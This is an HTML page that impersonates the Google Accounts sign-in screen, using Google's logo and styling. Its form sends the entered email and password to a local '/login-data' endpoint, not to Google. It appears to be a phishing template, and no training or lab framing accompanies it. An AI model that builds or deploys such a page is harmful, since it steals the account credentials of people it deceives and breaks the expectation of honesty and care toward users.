<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title><style>body{font-family:Roboto,Arial,sans-serif;background:#fff;margin:0;display:flex;justify-content:center;align-items:center;height:100vh}.card{width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px}.logo{text-align:center;margin-bottom:20px}.title{font-size:24px;color:#202124;-align:center}input{width:100%;height:56px;margin-top:24px;padding:13px 15px;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box}button{width:100%;height:36px;margin-top:24px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}</style></head><body><div class="card"><div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" height="24"></div><h1 class="title">Sign in</h1><form action="/login-data" method="post"><input type="text" name="username" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><input type="hidden" name="service" value="Google"><button type="submit">Next</button></form></div></body></html>
